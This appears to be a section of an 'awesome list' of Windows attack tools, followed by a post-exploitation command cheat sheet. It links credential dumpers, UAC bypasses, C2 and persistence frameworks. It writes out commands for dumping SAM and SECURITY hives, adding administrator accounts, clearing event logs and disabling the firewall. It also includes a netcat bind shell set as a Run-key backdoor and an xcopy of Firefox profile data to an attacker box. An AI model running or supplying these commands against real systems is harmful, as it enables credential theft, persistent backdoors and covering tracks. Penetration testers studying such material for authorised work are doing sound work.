## Windows

Awesome tools to play with Windows !
- **[Post exploitation commands](#post-exploitation commands)

List of tools used for exploiting Windows:

- **[Exploitation](https://github.com/hacksysteam/Exploitation)** : Windows Software Exploitation
- **[hacking-team-windows-kernel-lpe](https://github.com/vlad902/hacking-team-windows-kernel-lpe)** : Previously-0day exploit from the Hacking Team leak, written by Eugene Ching/Qavar.
- **[mimikatz](https://github.com/gentilkiwi/mimikatz)** : A little tool to play with Windows security - extract plaintexts passwords, hash, PIN code and kerberos tickets from memory.
- **[Pazuzu](https://github.com/BorjaMerino/Pazuzu)** : Reflective DLL to run binaries from memory
- **[Potato](https://github.com/foxglovesec/Potato)** : Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012
- **[UACME](https://github.com/hfiref0x/UACME)** : Defeating Windows User Account Control
- **[Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)** : This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.
- **[Redsnarf](https://github.com/nccgroup/redsnarf)** : RedSnarf is a pen-testing / red-teaming tool for Windows environments.
- **[Pupy](https://github.com/n1nj4sec/pupy)** : Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python.
- **[Empire](https://github.com/gold1029/Empire)** : Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.
- **[Veil Pillage](https://github.com/Veil-Framework/Veil-Pillage)** : Veil-Pillage is a post-exploitation framework that integrates with Veil-Evasion.
- **[Intersect](https://github.com/deadbits/Intersect-2.5)** : Post exploitation framework.
- **[Koadic](https://github.com/zerosum0x0/koadic)** : Koadic, or COM Command & Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire.

### Misc
- **[pwnwiki](http://pwnwiki.io)** : Post Exploitation Wiki (Multi-Platform)
- **[afot](https://github.com/harris21/afot)** : Automation Forensics Tool for Windows
- **[Invoke-LoginPrompt](https://github.com/enigma0x3/Invoke-LoginPrompt)** : Invokes a Windows Security Login Prompt and outputs the clear text password
- **[PowerShellArsenal](https://github.com/mattifestation/PowerShellArsenal)** : A PowerShell Module Dedicated to Reverse Engineering
- **[Winpayloads](https://github.com/nccgroup/Winpayloads)** : Undetectable Windows Payload Generation

### Guides
- **[Privlege escalation with Incognito](http://hardsec.net/post-exploitation-with-incognito/?lang=enPE%20with%20Incognito%C2%A0PE%20with%20Incognito)** : How to use Incognito for Privilege Escalation in Windows
- **[Hackarmoury](http://hackarmoury.com/)** : Large repository of information security tools available for easy upload from a compromised machine via ftp, http and other protocols.
- **[Pwning Windows Domains from the Command Line](https://crowdshield.com/blog.php?name=pwning-windows-domains-from-the-command-line)** : Several tools and techniques that can be used in order to compromise an entire Active Directory domain completely from the command line.
- **[Post Exploitation Wiki](https://github.com/mubix/post-exploitation-wiki)** : Post exploitation wiki.

### PowerShell

- **[BloodHound](https://github.com/adaptivethreat/BloodHound)** : Six Degrees of Domain Admin
- **[Empire](https://github.com/adaptivethreat/Empire)** : Empire is a PowerShell and Python post-exploitation agent
- **[Generate-Macro](https://github.com/enigma0x3/Generate-Macro)** : Powershell script will generate a malicious Microsoft Office document with a specified payload and persistence method
- **[Invoke-AltDSBackdoor](https://github.com/enigma0x3/Invoke-AltDSBackdoor)** : This script will obtain persistence on a Windows 7+ machine under both Standard and Administrative accounts by using two Alternate Data Streams
- **[Old-Powershell-payload-Excel-Delivery](https://github.com/enigma0x3/Old-Powershell-payload-Excel-Delivery)** : This version touches disk for registry persistence
- **[PSRecon](https://github.com/gfoss/PSRecon)** : PSRecon gathers data from a remote Windows host using PowerShell (v2 or later), organizes the data into folders, hashes all extracted data, hashes PowerShell and various system properties, and sends the data off to the security team
- **[PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite)** : Some useful scripts in powershell
- **[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)** : A PowerShell Post-Exploitation Framework
- **[PowerTools](https://github.com/PowerShellEmpire/PowerTools)** : A collection of PowerShell projects with a focus on offensive operations
- **[Powershell-C2](https://github.com/enigma0x3/Powershell-C2)** : A PowerShell script to maintain persistance on a Windows machine
- **[Powershell-Payload-Excel-Delivery](https://github.com/enigma0x3/Powershell-Payload-Excel-Delivery)** : Uses Invoke-Shellcode to execute a payload and persist on the system
- **[mimikittenz](https://github.com/putterpanda/mimikittenz)** : A post-exploitation powershell tool for extracting juicy info from memory.





### Post Exploitation Commands
Query information about the system, network/network connections, running services and services that run upon startup

**systeminfo**:  lists information about system
ipconfig/all: query ip configuation
ipconfig /displaydns

**arp /a**: check out viable targets

**Query current drives on system**
fsutil fsinfo drives

**Grab SAM and SYSTEM files**
type "C:/windows/repair/SAM"
type "C:/windows/repair/SYSTEM"

**Tasks**
tasklist /svc: lists running processes
taskkill /PID <process ID> /F : forcibly kill task
taskkill taskkill /PID xxx taskkill /IM name* of process to be terminated * can be used to kill all processes with same name tasklist /V /S computername: Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount
qprocess*: Similar to tasklist but easier to read

**Netstat**
netstat -ano : to see what services are running on what ports
netstat -bano
netstat -r
netstat -na | findstr :443

**nslookup**: query server information

**nbtstat**: Displays protocol stats and current TCP/IP connections using NetBIOS over TCP/IP

**Query information about server and workstation, Workstation domain name and Logon domain**
net config server
net config workstation

**net share**: view shared resources on network

**Change drive to different drive letter**
ex change to D:/ directory and list it's contents:
d: & dir
cd /d d: & dir
**Cat contents of file located in D:/ directory**
cd /d & type d:\blah\blah

**net view**
net view /domain[:DomainName]
net view \\computerName

arp /a

**Services**
**View list processes started upon startup**
net start
sc query
wmic startup get caption,command

**Query, Stop/Start/Pause Installed Services**
sc query state= all
sc query <service>
sc <stop> <service>

**Query user and account information**

whoami
whoami: view logged on user
whoami /all: lists privileges
whoami /user
whoami /groups
whoami /priv

net user: list users
For more info on a user:
net user <username> (for local user)
net user <username> /domain (for a domain user)

net accounts
net accounts /domain
net logalgroup administrators
net localgroup administrators /dmain
net group "domain Admins" /domain
net group "Enterprise Admins" /domain

arp -a: Lists all the systems current in the machine's ARP table

route print: Prints machines routing table

type "C:\documents and settings\administrator\userdata\index.dat"

**Add user**:
net users <username> <password> /add

**Add user to local administrators group**:
net localgroup administrators <username> /add

**Delete a user**:
net users username /delete /domain

**Change user's password**:
net users <username> <new_password>

View domain admins:
net group "Domain Admins" /domain

View name of domain controller:
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /v DC

Query group information:
net view /localgroup

net localgroup Administrators
net localgroup /Domain
gpresult: view group policy
gupdate: update group policy
gpresult /z

type %WINDIR%\System32\drivers\etc\hosts: view contents of hosts files

**Remote System Access**
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net share \\computername
tasklist /V /S computername
qwinsta /SERVER:computername
qprocess /SERVER:computername *
net use \\computername (maps IPC$ which does not show up as a drive)
net use \\computername /user:DOMAINNAME\username password ○ (maps IPC$ under another username)
net time \\computername (Shows the time of target computer)
dir \\computername\share_or_admin_share\ (dir list a remote directory)



**WMI**
wmic bios
wmic qfe
wmic qfe get hotfixid (This gets patches IDs)
wmic startup
wmic service
wmic os
wmic process get caption,executablepath,commandline
wmic process call create “process_name” (executes a program)
wmic process where name=”process_name” call terminate (terminates program)
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)
wmic useraccount (usernames, sid, and various security related goodies)
wmic useraccount get /ALL
wmic share get /ALL (you can use ? for gets help ! )
wmic startup list full (this can be a huge list!!!) ● wmic /node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)

**Reg Command**

reg save HKLM\Security security.hive (Save security hive to a file)
reg save HKLM\System system.hive (Save system hive to a file)
reg save HKLM\SAM sam.hive (Save sam to a file)=
reg add [\\TargetIPaddr\] [RegDomain][ \Key ]

reg export [RegDomain]\[Key] [FileName]
reg import [FileName ]
reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )

**Deleting Logs**
wevtutil el (list logs)
wevtutil cl

**Uninstalling Software**
wmic proud get name /value: gets software names
wmic product where name="XXX": call uninstall /Interactive:Off: unintalss software

qwinsta: Query info about RDP sessions
at: Query current scheduled tasks
schtasks: Query scheduled tasks that your current user has access to see.
set
schtasks /query /fo csv /v > %TEMP%

**Permissions**
icacls
Grant full access over directory and encompassing folders and files:
icacls "C:\windows" /grant Administrator:F /T
icacls "C:\" /grant "nt authority\system": F /T

net use: Map network shares
Mount a remote share with the rights of the current user:
net use K: \\<ip>\<share>
dir K:

**Enable remote desktop**
reg add "HKLM\System\CurrentControlSet\Control\TermServer" /v fDenyTSConnections /t REG_DWORD /f

net session: list session information

**Firewall**

Query state of firewall:
netsh firewall show state

Disable firewall
netsh.exe firewall set opmode mode=disable profile=all

Allow service through firewall
netsh.exe firewall set portopening tcp 123 MYSERVICE enable all

netsh.exe firewall set allowedprogram C:\MYPROGRAM.exe

HKLM\\software\\microsoft\\windows\\ currentversion\\run –d ‘C:\windows\system32\nc.exe -Ldp 4444 -e cmd.exe’ –v netcat

netsh firewall set allowedprogram c:\nc.exe allow_nc ENABLE

**Other useful Commands**
pkgmgr usefull /iu :"Package"
pkgmgr usefull /iu :"TellnetServer": install telnet service
pkgmgr /iu:"TelnetClient"
rundll32.exe user32.dll, LockWorkStation: locks the screen
wscript.exe <script js/vbs>
cscript.exe <script js/vbs/c#>
xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box

type "c:\Documents and Settings\Administrator\Local Settings\Application Data\Microsoft\Credentials"

cd "C:/Documents and settings\administrator\userdata" & dir

type "c:\Documents and Settings\Administrator\Desktop\UserMysql.txt"

type "c:\Documents and Settings\Administrator\Application Data\MySQL\mysqlx_user_connections.xml"

type "C:\documents and settings\administrator\userdata\index.dat"
